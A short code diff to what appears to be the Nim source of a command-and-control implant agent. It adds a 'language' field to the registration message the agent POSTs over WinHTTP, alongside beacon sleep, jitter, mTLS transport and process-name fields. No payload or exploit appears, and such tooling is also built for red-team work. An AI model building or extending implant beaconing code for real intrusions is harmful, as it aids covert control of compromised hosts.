@@ -157,7 +157,8 @@ proc register*(t: var AgentTransport): bool =
     "transport":    "mtls",
     "sleep_sec":    SleepSec,
     "jitter_pct":   JitterPct,
-    "process_name": exeName()
+    "process_name": exeName(),
+    "language":     "nim"
   }
   let (code, resp) = t.winHttpDo("POST", "/register", cast[seq[byte]]($info))
   if code != 200 or resp.len == 0: return false
